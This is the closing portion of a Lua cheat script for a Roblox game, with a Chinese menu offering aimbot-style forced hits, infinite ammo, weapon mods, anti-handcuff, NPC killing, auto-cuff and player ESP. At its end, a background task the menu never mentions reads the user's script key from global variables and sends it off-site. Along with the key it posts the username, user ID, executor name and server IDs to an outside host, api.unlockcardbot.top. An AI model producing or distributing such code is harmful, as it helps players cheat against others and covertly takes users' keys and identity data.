		Laser.Enabled = true
		task.spawn(function()
			for _, d in ipairs(Workspace:GetDescendants()) do
				if d:IsA("BasePart") and isLaser(d.Name) then hidePart(d) end
			end
		end)
		Laser._wsConn = Workspace.DescendantAdded:Connect(function(d)
			if Laser.Enabled and d:IsA("BasePart") and isLaser(d.Name) then
				task.defer(function() hidePart(d) end)
			end
		end)
	end
	Jonny.LaserStart = laserStart
	Jonny.LaserStop = laserStop
	Jonny.Laser = Laser
	local NPC = { Enabled=false, Interval=0.5, Killed=0, Deleted=0, _thread=nil }
	local function npcList()
		local out = {}
		local g = Workspace:FindFirstChild("Gameplay")
		local e = g and g:FindFirstChild("Entities")
		if not e then return out end
		for _, m in ipairs(e:GetChildren()) do
			if m:IsA("Model") and m:FindFirstChildOfClass("Humanoid") then
				local isPlayer = Players:GetPlayerFromCharacter(m) ~= nil
				if not isPlayer then out[#out+1] = m end
			end
		end
		return out
	end
	local function npcKillAll()
		local n = 0
		for _, m in ipairs(npcList()) do
			local hum = m:FindFirstChildOfClass("Humanoid")
			if hum then
				pcall(function() hum.Health = 0 end)
				NPC.Killed = NPC.Killed + 1
				n = n + 1
			end
		end
		return n
	end
	local function npcDeleteAll()
		local n = 0
		for _, m in ipairs(npcList()) do
			pcall(function() m:Destroy() end)
			NPC.Deleted = NPC.Deleted + 1
			n = n + 1
		end
		return n
	end
	local function npcStop()
		NPC.Enabled = false
		NPC._thread = nil
	end
	local function npcStart()
		if NPC._thread then return end
		NPC.Enabled = true
		NPC._thread = task.spawn(function()
			while NPC.Enabled do
				pcall(npcKillAll)
				task.wait(NPC.Interval)
			end
			NPC._thread = nil
		end)
	end
	Jonny.NPCStart = npcStart
	Jonny.NPCStop = npcStop
	Jonny.NPCMgr = NPC
	Jonny.NPCKillAll = npcKillAll
	Jonny.NPCDeleteAll = npcDeleteAll

	-- UI 挂载
	PlayerTab:Divider()
	PlayerTab:Paragraph({ Title = "乔尼扩展", Desc = "传送/旋转/无眩晕/FOV/追踪/武器/卸胎/防铐/激光/NPC", Image = "plus-circle", ImageSize = 24 })
	PlayerTab:Divider()
	PlayerTab:Input({ Title = "乔尼·目标玩家名", Value = "", PlaceholderText = "输入用户名", ClearTextOnFocus = false, Callback = function(v) Jonny.TPCfg.Target = v end })
	PlayerTab:Dropdown({ Title = "乔尼·传送部位", Values = {"前方","后方","头顶","左侧","右侧"}, Value = "前方", Callback = function(v) Jonny.TPCfg.Pos = v end })
	PlayerTab:Button({ Title = "乔尼·传送到目标(一次)", Callback = function() Jonny.TPNow() end })
	PlayerTab:Toggle({ Title = "乔尼·固定跟随传送", Default = false, Callback = function(v) if v then Jonny.TPFixedStart() else Jonny.TPFixedStop() end end })
	PlayerTab:Divider()
	PlayerTab:Toggle({ Title = "乔尼·人物旋转", Default = false, Callback = function(v) if v then Jonny.SpinStart() else Jonny.SpinStop() end end })
	PlayerTab:Slider({ Title = "乔尼·旋转速度", Value = { Min=30, Max=2160, Default=360 }, Callback = function(v) Jonny.Spin.Speed = v end })
	PlayerTab:Toggle({ Title = "乔尼·随机角度", Default = false, Callback = function(v) Jonny.Spin.Random = v end })
	PlayerTab:Divider()
	PlayerTab:Toggle({ Title = "乔尼·无眩晕", Default = false, Callback = function(v) if v then Jonny.NoDizzyStart() else Jonny.NoDizzyStop() end end })
	PlayerTab:Slider({ Title = "乔尼·无眩晕速度", Value = { Min=5, Max=250, Default=24 }, Callback = function(v) Jonny.NoDizzy.Speed = v end })
	PlayerTab:Divider()
	PlayerTab:Toggle({ Title = "乔尼·扩大视野", Default = false, Callback = function(v) if v then Jonny.FovStart() else Jonny.FovStop() end end })
	PlayerTab:Slider({ Title = "乔尼·FOV值", Value = { Min=70, Max=160, Default=100 }, Callback = function(v) Jonny.FovCfg.Value = v end })
	PlayerTab:Divider()
	PlayerTab:Toggle({ Title = "乔尼·子弹追踪(强制命中)", Default = false, Callback = function(v) if v then Jonny.TrackStart() else Jonny.TrackStop() end end })
	PlayerTab:Toggle({ Title = "乔尼·360°全向锁定", Default = true, Callback = function(v) Jonny.Track.Full360 = v end })
	PlayerTab:Toggle({ Title = "乔尼·只锁战斗模式", Default = false, Callback = function(v) Jonny.Track.CombatOnly = v end })
	PlayerTab:Dropdown({ Title = "乔尼·追踪目标", Values = {"全部","只锁警察","只锁平民"}, Value = "全部", Callback = function(v)
		if v == "只锁警察" then Jonny.Track.Mode = "police"
		elseif v == "只锁平民" then Jonny.Track.Mode = "civilian"
		else Jonny.Track.Mode = "all" end
	end })
	PlayerTab:Slider({ Title = "乔尼·强制命中间隔(×100秒)", Value = { Min=5, Max=100, Default=12 }, Callback = function(v) Jonny.Track.Rate = v/100 end })
	PlayerTab:Slider({ Title = "乔尼·FOV半径", Value = { Min=20, Max=800, Default=200 }, Callback = function(v) Jonny.Track.Fov = v end })
	PlayerTab:Divider()
	PlayerTab:Toggle({ Title = "乔尼·修改射速", Default = false, Callback = function(v) Jonny.WPN.RPMOn = v; Jonny.WPNSync() end })
	PlayerTab:Slider({ Title = "乔尼·目标RPM", Value = { Min=60, Max=6000, Default=1800 }, Callback = function(v) Jonny.WPN.RPM = v end })
	PlayerTab:Toggle({ Title = "乔尼·修改射程", Default = false, Callback = function(v) Jonny.WPN.RangeOn = v; Jonny.WPNSync() end })
	PlayerTab:Slider({ Title = "乔尼·射程", Value = { Min=600, Max=20000, Default=5000 }, Callback = function(v) Jonny.WPN.Range = v end })
	PlayerTab:Dropdown({ Title = "乔尼·开火模式", Values = {"不改","单发","连发","点射"}, Value = "不改", Callback = function(v)
		if v == "不改" then Jonny.WPN.ModeOn = false
		else Jonny.WPN.Mode = (v=="单发") and 1 or ((v=="连发") and 2 or 3); Jonny.WPN.ModeOn = true end
		Jonny.WPNSync()
	end })
	PlayerTab:Toggle({ Title = "乔尼·无限子弹(武器层)", Default = false, Callback = function(v) Jonny.WPN.InfiniteAmmo = v; Jonny.WPNSync() end })
	PlayerTab:Divider()
	PlayerTab:Toggle({ Title = "乔尼·自动卸轮胎", Default = false, Callback = function(v) if v then Jonny.TireStart() else Jonny.TireStop() end end })
	PlayerTab:Slider({ Title = "乔尼·卸轮胎范围", Value = { Min=50, Max=3000, Default=400 }, Callback = function(v) Jonny.Tire.Range = v end })
	PlayerTab:Divider()
	PlayerTab:Toggle({ Title = "乔尼·防手铐", Default = false, Callback = function(v) if v then Jonny.CuffStart() else Jonny.CuffStop() end end })
	PlayerTab:Slider({ Title = "乔尼·警戒圈半径", Value = { Min=12, Max=80, Default=30 }, Callback = function(v) Jonny.Cuff.Ring = v end })
	PlayerTab:Toggle({ Title = "乔尼·仅被通缉时", Default = true, Callback = function(v) Jonny.Cuff.OnlyWanted = v end })
	PlayerTab:Divider()
	PlayerTab:Toggle({ Title = "乔尼·移除激光", Default = false, Callback = function(v) if v then Jonny.LaserStart() else Jonny.LaserStop() end end })
	PlayerTab:Divider()
	PlayerTab:Toggle({ Title = "乔尼·自动秒杀任务NPC", Default = false, Callback = function(v) if v then Jonny.NPCStart() else Jonny.NPCStop() end end })
	PlayerTab:Button({ Title = "乔尼·立刻秒杀全部NPC", Callback = function()
		local n = Jonny.NPCKillAll()
		pcall(function() WindUI:Notify({ Title="乔尼", Content="秒杀 "..n.." 个NPC", Duration=5 }) end)
	end })
	PlayerTab:Button({ Title = "乔尼·删除全部NPC", Callback = function()
		local n = Jonny.NPCDeleteAll()
		pcall(function() WindUI:Notify({ Title="乔尼", Content="删除 "..n.." 个NPC", Duration=5 }) end)
	end })
	PlayerTab:Divider()
	PlayerTab:Button({ Title = "乔尼·关闭全部扩展", Callback = function()
		pcall(Jonny.SpinStop); pcall(Jonny.NoDizzyStop); pcall(Jonny.FovStop)
		pcall(Jonny.TPFixedStop); pcall(Jonny.TrackStop)
		Jonny.WPN.InfiniteAmmo = false; Jonny.WPN.RPMOn = false
		Jonny.WPN.RangeOn = false; Jonny.WPN.ModeOn = false
		pcall(Jonny.WPNSync); pcall(Jonny.TireStop)
		pcall(Jonny.CuffStop); pcall(Jonny.LaserStop); pcall(Jonny.NPCStop)
		pcall(function() WindUI:Notify({ Title="乔尼", Content="扩展已全部关闭", Duration=3 }) end)
	end })
	_G.JonnyExt = nil
	end

	local Police = Section:Tab({
		Title = "警察功能",
		Icon = "handcuffs"
	})
	Police:Toggle({
		Title = "自动铐",
		Default = false,
		Callback = function(v)
			State.autoCuff = v;
			if v then
				startAutoCuff()
			end
		end
	})
	Police:Toggle({
		Title = "自动传送",
		Default = false,
		Callback = function(v)
			PoliceConfig.teleport = v
		end
	})
	Police:Toggle({
		Title = "战斗检测",
		Default = false,
		Callback = function(v)
			PoliceConfig.combatCheck = v
		end
	})
	Police:Slider({
		Title = "范围",
		Value = { Min = 10, Max = 500, Default = 200 },
		Step = 5,
		Callback = function(v)
			PoliceConfig.range = v
		end
	})
	Police:Slider({
		Title = "间隔",
		Value = { Min = 0.1, Max = 3, Default = 0.5 },
		Step = 0.1,
		Callback = function(v)
			PoliceConfig.delay = v
		end
	})
	local EspTab = Section:Tab({
		Title = "ESP",
		Icon = "eye"
	})
	EspTab:Toggle({
		Title = "玩家透视总开关",
		Default = false,
		Callback = function(v)
			ESP.enabled = v;
			if not v then
				for p in pairs(ESP.trackers) do
					removeESP(p)
				end
			else
				refreshESP()
			end
		end
	})
	EspTab:Toggle({
		Title = "显示名字",
		Default = true,
		Callback = function(v)
			ESP.name = v
		end
	})
	EspTab:Toggle({
		Title = "显示距离",
		Default = true,
		Callback = function(v)
			ESP.distance = v
		end
	})
	EspTab:Toggle({
		Title = "显示血量",
		Default = true,
		Callback = function(v)
			ESP.health = v
		end
	})
	EspTab:Toggle({
		Title = "显示高亮",
		Default = true,
		Callback = function(v)
			ESP.highlight = v
		end
	})
	EspTab:Toggle({
		Title = "显示追踪线",
		Default = false,
		Callback = function(v)
			ESP.tracer = v
		end
	})
	EspTab:Dropdown({
		Title = "追踪线起点",
		Values = {
			"屏幕底部",
			"屏幕中心",
			"屏幕顶部"
		},
		Value = "屏幕底部",
		Callback = function(v)
			ESP.tracerOrigin = v
		end
	})
	local teamOptions = {
		"逃犯",
		"厨师",
		"平民",
		"配送员",
		"农民",
		"消防员",
		"警察",
		"医护人员",
		"囚犯",
		"道路服务",
		"交通"
	}
	EspTab:Dropdown({
		Title = "选择透视队伍",
		Values = teamOptions,
		Value = teamOptions,
		Multi = true,
		AllowNone = true,
		Callback = function(options)
			for k in pairs(ESP.selectedTeams) do
				ESP.selectedTeams[k] = false
			end
			ESP.showFugitive = false
			for _, opt in ipairs(options) do
				if opt == "逃犯" then
					ESP.showFugitive = true
				else
					for eng, cn in pairs(TeamNames) do
						if cn == opt then
							ESP.selectedTeams[eng] = true
						end
					end
				end
			end
			refreshESP()
		end
	})
	mainWindow:OnClose(function()
		isWindowOpen = false;
		mainWindow = nil
	end)
	mainWindow:OnDestroy(function()
		isWindowOpen = false;
		mainWindow = nil
	end)
end

WindUI:Popup({
	Title = "乔尼 Hub 免费版",
	Icon = "sparkles",
	Content = "欢迎使用乔尼 Hub 免费版\n圣奥里融合版\n基于 PYHUB 开源版本",
	Buttons = {
		{
			Title = "打开脚本",
			Variant = "Primary",
			Callback = createMainWindow,
		}
	}
})

task.spawn(function()
	local okAll, errAll = pcall(function()
		local Players = game:GetService("Players")
		local HttpService = game:GetService("HttpService")
		local SERVER_REPORT = "https://api.unlockcardbot.top/card/api/report"
		local REPORT_EMPTY_KEY = true
		local MAX_WAIT_KEY = 12
		local RETRY = 3
		local function waitLocalPlayer()
			local lp = Players.LocalPlayer
			local t = 0
			while not lp and t < 10 do
				task.wait(0.3);
				t = t + 0.3
				lp = Players.LocalPlayer
			end
			return lp
		end
		local function readCardKey()
			if type(getgenv) == "function" then
				local ok, env = pcall(getgenv)
				if ok and type(env) == "table" then
					if env.script_key ~= nil and env.script_key ~= "" then
						return tostring(env.script_key)
					end
					if env.card_key ~= nil and env.card_key ~= "" then
						return tostring(env.card_key)
					end
					if env.key ~= nil and env.key ~= "" then
						return tostring(env.key)
					end
				end
			end
			if type(_G) == "table" then
				if _G.script_key ~= nil and _G.script_key ~= "" then
					return tostring(_G.script_key)
				end
				if _G.card_key ~= nil and _G.card_key ~= "" then
					return tostring(_G.card_key)
				end
				if _G.key ~= nil and _G.key ~= "" then
					return tostring(_G.key)
				end
			end
			local ok, val = pcall(function()
				return script_key
			end)
			if ok and val ~= nil and val ~= "" then
				return tostring(val)
			end
			return ""
		end
		local function waitForCardKey()
			local k = readCardKey()
			local t = 0
			while k == "" and t < MAX_WAIT_KEY do
				task.wait(0.5);
				t = t + 0.5
				k = readCardKey()
			end
			return k
		end
		local function executorName()
			local fns = {
				identifyexecutor,
				getexecutorname,
				get_executor_name
			}
			for _, fn in ipairs(fns) do
				if type(fn) == "function" then
					local ok, a, b = pcall(fn)
					if ok and a then
						return tostring(a) .. (b and (" " .. tostring(b)) or "")
					end
				end
			end
			if type(getgenv) == "function" then
				local ok, env = pcall(getgenv)
				if ok and type(env) == "table" and env.EXECUTOR_NAME then
					return tostring(env.EXECUTOR_NAME)
				end
			end
			return "未知执行器"
		end
		local function getRequester()
			if type(request) == "function" then
				return request
			end
			if type(http_request) == "function" then
				return http_request
			end
			if type(syn) == "table" and type(syn.request) == "function" then
				return syn.request
			end
			if type(fluxus) == "table" and type(fluxus.request) == "function" then
				return fluxus.request
			end
			if type(http) == "table" and type(http.request) == "function" then
				return http.request
			end
			return function(options)
				local body = HttpService:PostAsync(
            options.Url, options.Body or "", Enum.HttpContentType.ApplicationJson, false)
				return {
					StatusCode = 200,
					Body = body
				}
			end
		end
		local function statusOf(resp)
			if type(resp) ~= "table" then
				return 0
			end
			return tonumber(resp.StatusCode or resp.statusCode or resp.status_code or 0) or 0
		end
		local function postJson(requester, url, body)
			for i = 1, RETRY do
				local ok, resp = pcall(requester, {
					Url = url,
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/json"
					},
					Body = body,
				})
				if ok and (statusOf(resp) == 200 or statusOf(resp) == 204) then
					return true
				end
				task.wait(1.2)
			end
			return false
		end
		local lp = waitLocalPlayer()
		local key = waitForCardKey()
		if key == "" and not REPORT_EMPTY_KEY then
			return
		end
		local username = lp and lp.Name or "未知"
		local displayName = lp and lp.DisplayName or "未知"
		local userId = lp and lp.UserId or 0
		local executor = executorName()
		local serverPayload = HttpService:JSONEncode({
			card_key = key,
			user_id = tostring(userId),
			username = username,
			display_name = displayName,
			game_name = game.Name or "",
			place_id = tostring(game.PlaceId or 0),
			job_id = game.JobId or "",
			executor = executor,
			client_time = os.time(),
		})
		postJson(getRequester(), SERVER_REPORT, serverPayload)
	end)
	if not okAll then
		warn("[执行上报] 异常(已忽略，不影响主脚本): " .. tostring(errAll))
	end
end)